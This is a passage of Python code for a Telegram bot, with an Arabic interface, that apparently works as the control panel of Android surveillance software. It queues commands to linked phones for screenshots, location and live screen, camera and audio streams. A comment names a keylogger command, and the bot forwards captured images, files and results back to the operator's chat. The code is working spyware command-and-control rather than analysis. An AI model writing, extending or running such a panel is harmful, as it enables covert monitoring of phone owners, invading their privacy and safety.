        await send_message(chat_id, "📋 القائمة الرئيسية:", reply_markup=main_menu_keyboard(chat_id))

    elif callback_data == "menu_devices":
        if not devices:
            await send_message(chat_id, "📱 لا توجد أجهزة. استخدم /link لربط جهاز.")
        else:
            text = f"📱 <b>اختر جهازاً ({len(devices)})</b>"
            await send_message(chat_id, text, reply_markup=device_list_keyboard(chat_id))

    elif callback_data == "menu_commands":
        if not session.get("selected_device"):
            await send_message(chat_id, "⚠️ اختر جهازاً أولاً.", reply_markup=device_list_keyboard(chat_id))
        else:
            await send_message(chat_id, "🎮 اختر فئة الأوامر:",
                             reply_markup=command_category_picker(session["selected_device"]))

    elif callback_data == "do_link":
        # Lifelong permanent code (one per user, stored in Firebase).
        code = await store.get_or_create_permanent_code(user['id'])
        if _fb.firebase_connected:
            try:
                from .firebase_client import sync_permanent_code
                await sync_permanent_code(user['email'], code, user['id'])
            except Exception as e:
                logger.warning(f"Failed to sync permanent code to Firebase: {e}")
        await send_message(chat_id,
            f"🔗 <b>كود الربط الخاص بك</b>\n\n<code>{code}</code>\n\n"
            f"♾️ صالح مدى الحياة — لا يحتاج للتجديد.",
            reply_markup=main_menu_keyboard(chat_id))

    # ─── Dashboard Parity Views (mirrors web dashboard sidebar) ─
    elif callback_data == "view_overview":
        # Mirrors web dashboard's overview.tsx: server stats + devices summary
        stats = store.get_stats()
        online_devices = [d for d in devices if store._device_last_online.get(d['id'], False)]
        offline_devices = [d for d in devices if not store._device_last_online.get(d['id'], False)]
        text = (
            f"📊 <b>لوحة المعلومات</b>\n\n"
            f"🖥️ الخادم: ✅ يعمل | ⏱️ {stats['uptime'] // 3600}س {stats['uptime'] % 3600 // 60}د\n"
            f"🔥 Firebase: {'متصل' if _fb.firebase_connected else 'غير متصل'} | v{VERSION}\n\n"
            f"📱 <b>الأجهزة</b> ({stats['devices_total']})\n"
            f"   🟢 متصل: {stats['devices_online']} | 🔴 غير متصل: {stats['devices_offline']}\n\n"
            f"🎮 <b>الأوامر</b>\n"
            f"   الإجمالي: {stats['commands_total']}\n"
            f"   ✅ مكتملة: {stats['commands_completed']}\n"
            f"   ⏳ معلقة: {stats['commands_pending']}\n\n"
            f"📋 الأحداث: {stats['events_count']}\n"
            f"📁 ملفات نشطة: {stats['files_active']}\n"
            f"👤 المستخدمون: {stats['users_total']}\n"
        )
        if online_devices:
            text += "\n🟢 <b>الأجهزة المتصلة:</b>\n"
            for d in online_devices[:5]:
                text += f"   • {d.get('model', d['id'])}\n"
        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))

    elif callback_data == "view_results":
        # Mirrors web dashboard's command-results.tsx: shows completed command results
        selected = session.get("selected_device")
        cmds = await store.get_commands_history(device_id=selected, limit=15)
        cmds = [c for c in cmds if c.get('status') in ('completed', 'failed')]
        if not cmds:
            await send_message(chat_id,
                "✅ <b>نتائج الأوامر</b>\n\nلا توجد نتائج بعد."
                + ("\n⚠️ اختر جهازاً أولاً لعرض نتائجه." if not selected else ""),
                reply_markup=inline_keyboard([[
                    ("📱 اختيار جهاز", "menu_devices"),
                    ("🔙 القائمة", "back_main"),
                ]]))
            return
        text = f"✅ <b>نتائج الأوامر ({len(cmds)})</b>\n\n"
        for c in cmds[:10]:
            status_icon = "✅" if c.get('status') == 'completed' else "❌"
            cmd = c.get('command', '')
            dev = store.devices.get(c.get('device_id', ''), {})
            dev_name = dev.get('model', c.get('device_id', '')[:8])
            result_preview = str(c.get('result', ''))[:80].replace('\n', ' ')
            text += f"{status_icon} <b>{cmd}</b> → {dev_name}\n"
            if result_preview:
                text += f"   <code>{result_preview}</code>\n"
        await send_message(chat_id, text, reply_markup=inline_keyboard([[
            ("🔄 تحديث", "view_results"),
            ("🔙 القائمة", "back_main"),
        ]]))

    elif callback_data == "view_streaming":
        # Mirrors web dashboard's streaming-viewer.tsx: start/stop streams
        selected = session.get("selected_device")
        if not selected:
            await send_message(chat_id, "⚠️ اختر جهازاً أولاً.",
                             reply_markup=device_list_keyboard(chat_id))
            return
        device = store.devices.get(selected)
        if not device:
            await send_message(chat_id, "❌ الجهاز غير موجود.")
            return
        online = store._device_last_online.get(selected, False)
        status = "🟢 متصل" if online else "🔴 غير متصل"
        await send_message(chat_id,
            f"📡 <b>البث المباشر</b>\n\n"
            f"📱 الجهاز: {device.get('model', selected)}\n"
            f"📊 الحالة: {status}\n\n"
            f"اختر نوع البث:",
            reply_markup=streaming_keyboard(selected))

    elif callback_data.startswith("stream_start_"):
        # stream_start_<type>_<device_id>  where type ∈ {screen, front, back, audio}
        rest = callback_data[len("stream_start_"):]
        stream_type, device_id = _parse_stream_callback(rest)
        if not device_id:
            await send_message(chat_id, "❌ تعذر تحديد الجهاز.")
            return
        cmd_map = {
            "screen": "start_screen_stream",
            "front": "start_camera_stream",
            "back": "start_camera_stream",
            "audio": "start_audio_stream",
        }
        cmd_key = cmd_map.get(stream_type)
        if not cmd_key:
            await send_message(chat_id, f"❌ نوع بث غير معروف: {stream_type}")
            return
        params = {"camera": "back"} if stream_type == "back" else (
                  {"camera": "front"} if stream_type == "front" else {})
        await execute_device_command(chat_id, cmd_key, device_id, user, params_override=params)

    elif callback_data.startswith("stream_stop_"):
        rest = callback_data[len("stream_stop_"):]
        stream_type, device_id = _parse_stream_callback(rest)
        if not device_id:
            await send_message(chat_id, "❌ تعذر تحديد الجهاز.")
            return
        cmd_map = {
            "screen": "stop_screen_stream",
            "front": "stop_camera_stream",
            "back": "stop_camera_stream",
            "audio": "stop_audio_stream",
            "all": "stop_all_streams",
        }
        cmd_key = cmd_map.get(stream_type, "stop_all_streams")
        await execute_device_command(chat_id, cmd_key, device_id, user)

    elif callback_data.startswith("stream_frame_"):
        # Fetch the latest cached frame from store.latest_frames and send as photo
        device_id = callback_data[len("stream_frame_"):]
        frame = store.latest_frames.get(f"{device_id}:video")
        if not frame or not frame.get('data'):
            await send_message(chat_id,
                "⚠️ لا يوجد إطار متاح. تأكد أن البث يعمل ثم حاول مجدداً.",
                reply_markup=streaming_keyboard(device_id))
            return
        try:
            import base64
            img_bytes = base64.b64decode(frame['data'])
            await send_photo(chat_id, img_bytes,
                caption=f"📸 إطار مباشر — {datetime.utcnow().strftime('%H:%M:%S')} UTC",
                reply_markup=streaming_keyboard(device_id))
        except Exception as e:
            await send_message(chat_id, f"❌ فشل فك ترميز الإطار: {e}")

    elif callback_data == "view_files":
        # Mirrors web dashboard's file-viewer.tsx: lists uploaded files grouped by type
        user_id = user['id']
        is_admin = user.get('role') == 'admin'
        files = []
        for fid, fmeta in store.files.items():
            dev = store.devices.get(fmeta.get('device_id', ''))
            if not dev:
                continue
            if is_admin or dev.get('owner_id') == user_id:
                safe = dict(fmeta)
                safe['device_name'] = dev.get('model', dev['id'])
                files.append(safe)
        if not files:
            await send_message(chat_id,
                "📁 <b>الملفات</b>\n\nلا توجد ملفات مرفوعة.\n"
                "الملفات تُحذف تلقائياً بعد ساعة من رفعها.",
                reply_markup=main_menu_keyboard(chat_id))
            return
        # Group by file_type
        groups = {}
        for f in files:
            t = f.get('file_type', 'other')
            groups.setdefault(t, []).append(f)
        text = f"📁 <b>الملفات ({len(files)})</b>\n\n"
        type_icons = {"screenshot": "📸", "photo": "🖼️", "video": "🎬",
                      "audio": "🎵", "document": "📄", "other": "📎"}
        for ftype, fitems in groups.items():
            icon = type_icons.get(ftype, "📎")
            text += f"{icon} <b>{ftype}</b> ({len(fitems)})\n"
            for f in fitems[:3]:
                name = f.get('filename', 'unknown')[:30]
                size_kb = (f.get('size', 0) or 0) // 1024
                text += f"   • {name} ({size_kb} KB) — {f.get('device_name', '?')}\n"
            if len(fitems) > 3:
                text += f"   • ...و {len(fitems) - 3} ملفات أخرى\n"
            text += "\n"
        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))

    elif callback_data == "view_events":
        # Mirrors web dashboard's events view
        selected = session.get("selected_device")
        events = await store.get_events(device_id=selected, limit=15)
        if not events:
            await send_message(chat_id,
                "📋 <b>الأحداث</b>\n\nلا توجد أحداث.",
                reply_markup=inline_keyboard([[
                    ("🔄 تحديث", "view_events"),
                    ("🔙 القائمة", "back_main"),
                ]]))
            return
        text = f"📋 <b>آخر الأحداث ({len(events)})</b>\n\n"
        for evt in events[:10]:
            icon = {"info": "ℹ️", "success": "✅", "warning": "⚠️", "error": "❌"}.get(evt.get('level', ''), "ℹ️")
            text += f"{icon} {evt.get('event', '')[:80]}\n"
            if evt.get('details'):
                text += f"   <i>{evt['details'][:60]}</i>\n"
        await send_message(chat_id, text, reply_markup=inline_keyboard([[
            ("🔄 تحديث", "view_events"),
            ("🔙 القائمة", "back_main"),
        ]]))

    elif callback_data == "view_users":
        # Mirrors web dashboard's users view (admin only)
        if user.get('role') != 'admin':
            await send_message(chat_id, "⛔ هذه الميزة للمسؤول فقط.",
                             reply_markup=main_menu_keyboard(chat_id))
            return
        users = await store.list_users()
        text = f"👥 <b>المستخدمون ({len(users)})</b>\n\n"
        for u in users[:15]:
            role_icon = "👑" if u.get('role') == 'admin' else "👤"
            devices_count = sum(1 for d in store.devices.values() if d.get('owner_id') == u['id'])
            text += (f"{role_icon} <b>{u.get('username', '?')}</b> "
                     f"[{u.get('role', 'user')}]\n"
                     f"   📧 {u.get('email', '?')}\n"
                     f"   📱 {devices_count} جهاز\n"
                     f"   🆔 <code>{u['id']}</code>\n\n")
        await send_message(chat_id, text, reply_markup=main_menu_keyboard(chat_id))

    # ─── Server Management ────────────────────────────────────
    elif callback_data == "srv_status":
        stats = store.get_stats()
        await send_message(chat_id,
            f"📡 <b>حالة الخادم</b>\n✅ يعمل | ⏱️ {stats['uptime'] // 3600}س | "
            f"📱 {stats['devices_online']}/{stats['devices_total']} | "
            f"🔥 {'متصل' if _fb.firebase_connected else 'غير متصل'} | v{VERSION}")

    elif callback_data == "srv_stats":
        stats = store.get_stats()
        await send_message(chat_id,
            f"📊 الأجهزة: {stats['devices_total']} | متصل: {stats['devices_online']} | "
            f"أوامر: {stats['commands_completed']}/{stats['commands_total']} | "
            f"أحداث: {stats['events_count']} | ملفات: {stats['files_active']}")

    elif callback_data == "srv_logs":
        events = await store.get_events(limit=10)
        text = "📋 آخر السجلات:\n"
        for evt in events[:5]:
            icon = {"info": "ℹ️", "success": "✅", "warning": "⚠️", "error": "❌"}.get(evt.get('level', ''), "ℹ️")
            text += f"{icon} {evt.get('event', '')[:60]}\n"
        await send_message(chat_id, text if len(text) > 25 else "📋 لا توجد سجلات.")

    elif callback_data == "srv_settings":
        text = "⚙️ الإعدادات:\n"
        for k, v in store.settings.items():
            text += f"• {k}: {v}\n"
        await send_message(chat_id, text)
    
    # ─── Device Selection ─────────────────────────────────────
    elif callback_data.startswith("dev_"):
        device_id = callback_data[4:]
        device = store.devices.get(device_id)
        if not device:
            await send_message(chat_id, "❌ الجهاز غير موجود.")
            return
        # Ownership enforcement: only the device's owner (or admin) may view it.
        if device.get('owner_id') != user['id'] and user.get('role') != 'admin':
            await send_message(chat_id, "⛔ ليس لديك صلاحية للوصول إلى هذا الجهاز.")
            return
        # Persist the selected_device change (state mutation worth saving).
        session["selected_device"] = device_id
        await _persist_tg_session(chat_id)
        online = store._device_last_online.get(device_id, False)
        battery = device.get('battery', 'N/A')
        model = device.get('model', 'Unknown')
        brand = device.get('brand', '')
        os_ver = device.get('os', '')

        text = (
            f"📱 <b>{model}</b>\n\n"
            f"🏷️ المعرف: <code>{device_id}</code>\n"
            f"🏢 الشركة: {brand}\n"
            f"Android: {os_ver}\n"
            f"🔋 البطارية: {battery}%\n"
            f"{'🟢 متصل' if online else '🔴 غير متصل'}\n"
            f"📅 الربط: {device.get('created_at', 'N/A')[:10]}"
        )
        await send_message(chat_id, text, reply_markup=device_menu_keyboard(device_id))
    
    # ─── Quick Actions ────────────────────────────────────────
    elif callback_data.startswith("quick_screenshot_"):
        device_id = callback_data[len("quick_screenshot_"):]
        await execute_device_command(chat_id, "screenshot", device_id, user)
    
    elif callback_data.startswith("quick_location_"):
        device_id = callback_data[len("quick_location_"):]
        await execute_device_command(chat_id, "location", device_id, user)
    
    elif callback_data.startswith("quick_battery_"):
        device_id = callback_data[len("quick_battery_"):]
        await execute_device_command(chat_id, "battery", device_id, user)
    
    # ─── Category Submenus ───────────────────────────────────
    elif callback_data.startswith("submenu_"):
        # Format: submenu_<category>_<device_id>. Categories come from
        # CMD_CATEGORIES (data, social, control, apps, files, security,
        # monitor, streaming) — none contain underscores, but we still use
        # a registry-style lookup for robustness against future renames.
        rest = callback_data[len("submenu_"):]
        category = None
        device_id = None
        for cat_id in CMD_CATEGORIES:
            prefix = cat_id + "_"
            if rest.startswith(prefix):
                category = cat_id
                device_id = rest[len(prefix):]
                break
        if category and device_id:
            # Ownership enforcement before showing command menu for a device.
            device = store.devices.get(device_id)
            if not device or (device.get('owner_id') != user['id'] and user.get('role') != 'admin'):
                await send_message(chat_id, "⛔ ليس لديك صلاحية للوصول إلى هذا الجهاز.")
                return
            cat_info = CMD_CATEGORIES.get(category, {})
            await send_message(chat_id, f"📂 {cat_info.get('name', category)}:",
                             reply_markup=category_commands_keyboard(category, device_id))
        else:
            await send_message(chat_id, "❌ فئة غير معروفة.",
                             reply_markup=main_menu_keyboard(chat_id))

    # ─── Execute Command ──────────────────────────────────────
    elif callback_data.startswith("exec_"):
        # Format: exec_<cmd_key>_<device_id>. Many cmd_keys contain underscores
        # (e.g. wifi_info, start_screen_stream, keylogger_start), so we can't
        # use a simple split. Instead, look up the cmd_key in COMMAND_REGISTRY.
        rest = callback_data[len("exec_"):]
        cmd_key = None
        device_id = None
        for key in COMMAND_REGISTRY:
            prefix = key + "_"
            if rest.startswith(prefix):
                cmd_key = key
                device_id = rest[len(prefix):]
                break
        if cmd_key and device_id:
            await execute_device_command(chat_id, cmd_key, device_id, user)
        else:
            await send_message(chat_id, f"❌ تعذر تحديد الأمر: <code>{rest}</code>",
                             reply_markup=main_menu_keyboard(chat_id))
    
    # ─── Unlink Device ────────────────────────────────────────
    elif callback_data.startswith("do_unlink_"):
        device_id = callback_data[len("do_unlink_"):]
        success = await store.unlink_device(device_id, user['id'])
        if success:
            # Clear selected_device if it was the unlinked one (state mutation).
            if session.get("selected_device") == device_id:
                session["selected_device"] = None
                await _persist_tg_session(chat_id)
            await send_message(chat_id, f"✅ تم فك ربط الجهاز.", reply_markup=main_menu_keyboard(chat_id))
        else:
            await send_message(chat_id, "❌ فشل فك الربط.")
    
    else:
        await send_message(chat_id, "❓ إجراء غير معروف.", reply_markup=main_menu_keyboard(chat_id))


# ─── Command Execution ────────────────────────────────────────

async def execute_device_command(chat_id: str, cmd_key: str, device_id: str, user: dict,
                               params_override: dict = None):
    """Execute a command on a device and track the result for Telegram delivery.

    ``params_override`` lets callers (e.g. streaming start with camera=front/back)
    supply extra params on top of the registry defaults.
    """
    cmd_def = COMMAND_REGISTRY.get(cmd_key)
    if not cmd_def:
        await send_message(chat_id, f"❌ الأمر غير معروف: {cmd_key}")
        return
    
    device = store.devices.get(device_id)
    if not device:
        await send_message(chat_id, "❌ الجهاز غير موجود.")
        return
    
    # ─── Ownership enforcement (multi-user isolation) ───────────
    # A user may only execute commands on devices they own.
    if device.get('owner_id') != user['id'] and user.get('role') != 'admin':
        await send_message(chat_id, "⛔ ليس لديك صلاحية للتحكم في هذا الجهاز.")
        logger.warning(f"TG ownership denied: chat={chat_id} user={user.get('id')} device={device_id} owner={device.get('owner_id')}")
        return
    
    online = store._device_last_online.get(device_id, False)
    if not online:
        await send_message(chat_id, f"⚠️ الجهاز غير متصل حالياً. سيتم تنفيذ الأمر عند الاتصال.")
    
    cmd_name = cmd_def.get('name', cmd_key)
    cmd_icon = cmd_def.get('icon', '🎮')
    actual_cmd = cmd_def['cmd']
    params = dict(cmd_def.get('params', {}))  # copy so we don't mutate the registry
    if params_override:
        params.update(params_override)
    
    # Queue the command
    queued = await store.queue_command(
        device_id=device_id,
        command=actual_cmd,
        params=params,
        requested_by=user['id'],
        source="telegram"
    )
    
    # Also push to Firebase for real-time delivery
    from .firebase_client import push_command
    if _fb.firebase_connected:
        try:
            await push_command(device_id, {
                "id": queued['id'],
                "command": actual_cmd,
                "params": params,
                "created_at": queued['created_at'],
            })
        except Exception as e:
            logger.warning(f"Firebase push failed for cmd {queued['id']}: {e}")
    
    # Track for result delivery
    msg = await send_message(chat_id,
        f"{cmd_icon} <b>{cmd_name}</b>\n\n"
        f"📱 الجهاز: {device.get('model', device_id)}\n"
        f"⏳ جاري التنفيذ...",
        reply_markup=inline_keyboard([[("🔙 رجوع", f"dev_{device_id}")]]))
    
    if msg and msg.get('ok') and msg.get('result'):
        store.pending_messages[queued['id']] = {
            "chat_id": chat_id,
            "message_id": msg['result'].get('message_id'),
            "command_id": queued['id'],
            "device_id": device_id,
            "cmd_name": cmd_name,
            "created_at": time.time(),
        }
    
    await store.add_event("command", f"Command queued via Telegram: {cmd_name} -> {device_id}",
                         "info", device_id=device_id, user_id=user['id'])


# ─── Result Forwarding ────────────────────────────────────────

async def forward_result(command_id: str, result_data: any):
    """Forward a command result to the Telegram user who requested it.

    Called from api_command_result when a device submits a result. Detects
    base64-encoded images (JPEG/PNG), long text, JSON, and short text, and
    delivers the appropriate Telegram message type.
    """
    msg_info = store.pending_messages.pop(command_id, None)
    if not msg_info:
        return

    chat_id = msg_info['chat_id']
    device_id = msg_info['device_id']
    cmd_name = msg_info.get('cmd_name', 'Command')
    status = msg_info.get('status', 'completed')

    # Normalise result to string
    if result_data is None:
        result_str = ""
    elif isinstance(result_data, str):
        result_str = result_data
    else:
        try:
            result_str = json.dumps(result_data, ensure_ascii=False, default=str)
        except Exception:
            result_str = str(result_data)

    # Detect base64 image (JPEG: /9j/, PNG: iVBORw0KGgo)
    is_jpeg = result_str.startswith('/9j/') and len(result_str) > 1000
    is_png = result_str.startswith('iVBORw0KGgo') and len(result_str) > 1000
    is_image = is_jpeg or is_png

    status_icon = "✅" if status != 'failed' else "❌"

    if is_image:
        try:
            import base64
            img_bytes = base64.b64decode(result_str)
            await send_photo(chat_id, img_bytes, caption=f"{status_icon} {cmd_name}")
        except Exception as e:
            logger.warning(f"forward_result: image decode failed: {e}")
            await send_message(chat_id,
                f"{status_icon} <b>{cmd_name}</b>\n\nنتيجة طويلة جداً لعرضها ({len(result_str)} حرف).")
    elif len(result_str) > 4000:
        # Long text: try to send as document for full content
        try:
            await send_document(chat_id,
                result_str.encode('utf-8'),
                filename=f"{cmd_name}_{command_id[:8]}.txt",
                caption=f"{status_icon} {cmd_name} — النتيجة الكاملة")
        except Exception:
            await send_message(chat_id,
                f"{status_icon} <b>{cmd_name}</b>\n\n{result_str[:4000]}...")
    elif result_str:
        # Short text: send inline
        await send_message(chat_id,
            f"{status_icon} <b>{cmd_name}</b>\n\n<code>{result_str}</code>")
    else:
        await send_message(chat_id,
            f"{status_icon} <b>{cmd_name}</b>\n\nتم التنفيذ بنجاح.")

    # Also update the original "جاري التنفيذ..." message if we have its id
    orig_msg_id = msg_info.get('message_id')
    if orig_msg_id:
        try:
            await api_call("editMessageText", {
                "chat_id": chat_id,
                "message_id": orig_msg_id,
                "text": f"{status_icon} <b>{cmd_name}</b>\n\nتم استلام النتيجة ✅",
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            })
        except Exception:
            pass  # Best-effort edit


# ─── Polling Loop ─────────────────────────────────────────────

async def poll_loop():
    """Main Telegram long-polling loop."""
    global tg_offset, polling_active
    polling_active = True
    
    while polling_active:
        try:
            await init_session()
            url = f"{API_BASE}/getUpdates"
            payload = {"offset": tg_offset, "timeout": 30, "allowed_updates": ["message", "callback_query"]}
            
            async with _tg_session.post(url, json=payload, timeout=ClientTimeout(total=35)) as resp:
                data = await resp.json()
            
            if not data.get('ok'):
                await asyncio.sleep(5)
                continue
            
            for update in data.get('result', []):
                update_id = update.get('update_id', 0)
                if update_id >= tg_offset:
                    tg_offset = update_id + 1
                
                # Dedup
                if update_id in store._tg_processed_updates:
                    continue
                store._tg_processed_updates.add(update_id)
                if len(store._tg_processed_updates) > 500:
                    store._tg_processed_updates = set(list(store._tg_processed_updates)[-250:])
                
                # Process message
                if 'message' in update:
                    msg = update['message']
                    chat_id = msg.get('chat', {}).get('id')
                    text = msg.get('text', '')
                    message_id = msg.get('message_id', 0)
                    from_user = msg.get('from', {})
                    if text:
                        await handle_message(chat_id, text, message_id, from_user)
                
                # Process callback query
                elif 'callback_query' in update:
                    cb = update['callback_query']
                    chat_id = cb.get('message', {}).get('chat', {}).get('id')
                    callback_data = cb.get('data', '')
                    cb_id = cb.get('id', '')
                    if callback_data:
                        await handle_callback(chat_id, callback_data, cb_id)
        
        except asyncio.CancelledError:
            break
        except Exception as e:
            logger.error(f"TG poll error: {e}")
            await asyncio.sleep(5)


async def start_bot():
    """Start the Telegram bot polling."""
    global bot_username

    # Fetch the bot username dynamically via getMe — used for building
    # deep-link URLs (https://t.me/<bot_username>?start=<token>) for the
    # account-linking flow. Cached globally so api_handlers can expose it.
    try:
        me = await api_call("getMe", {})
        if me and me.get('ok') and me.get('result', {}).get('username'):
            bot_username = me['result']['username']
            logger.info(f"Telegram bot username: @{bot_username}")
        else:
            logger.warning(f"getMe did not return username: {me}")
    except Exception as e:
        logger.warning(f"Failed to fetch bot username via getMe: {e}")

    # Set bot commands
    await api_call("setMyCommands", {
        "commands": [
            {"command": "start", "description": "القائمة الرئيسية / ربط الحساب"},
            {"command": "help", "description": "قائمة الأوامر"},
            {"command": "menu", "description": "عرض القائمة"},
            {"command": "overview", "description": "لوحة المعلومات (نظرة عامة)"},
            {"command": "devices", "description": "قائمة الأجهزة"},
            {"command": "results", "description": "نتائج الأوامر الأخيرة"},
            {"command": "streaming", "description": "إدارة البث المباشر"},
            {"command": "files", "description": "الملفات المرفوعة"},
            {"command": "events", "description": "آخر الأحداث"},
            {"command": "link", "description": "كود الربط الخاص بك (دائم)"},
            {"command": "unlink", "description": "فك ربط جهاز"},
            {"command": "users", "description": "المستخدمون (للمسؤول)"},
            {"command": "status", "description": "حالة الخادم"},
            {"command": "stats", "description": "الإحصائيات"},
            {"command": "logs", "description": "آخر السجلات"},
            {"command": "settings", "description": "الإعدادات"},
            {"command": "search", "description": "البحث في الأجهزة"},
        ]
    })
    asyncio.create_task(poll_loop())
    logger.info("Telegram bot started")